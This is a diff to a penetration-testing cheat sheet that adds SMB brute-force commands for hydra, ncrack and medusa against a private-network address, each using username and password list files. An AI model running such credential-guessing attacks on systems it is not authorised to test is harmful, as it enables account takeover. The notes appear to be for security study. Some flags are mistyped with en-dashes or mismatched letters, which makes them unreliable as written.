@@ -65,10 +65,16 @@ Less common options:
 
 -e ns = checks for blank or no password fields 
 
+#### HTTP Form Bruteforce
 
 Brute-force HTTP Form POST using a username list to try different usernames
 
 > hydra -L \[username list\] -P \[password list\] 192.168.1.10 \[form parameters\]\[failed login message\]
+
+#### SMB Bruteforce
+hydra –L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.118 smb
+
+
 
 ### Ncrack
 
@@ -76,7 +82,21 @@ Brute-force HTTP Form POST using a username list to try different usernames
 
 > ncrack -vv --user offsec -P passwordfile.txt  rdp://192.168.11.35
 
+#### SMB Bruteforce
+
+> `ncrack –u /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.118 –p 445`
+
+-U - denotes the path of username list
+
+-P – denotes password file’s path
+
+-p – is the port number
+
 ### Medusa
+
+#### SMB Bruteforce
+
+> `medusa -h 192.168.1.118 -U /root/Desktop/user.txt -P /root/Desktop/pass.txt -M smbnt`
 
 
 
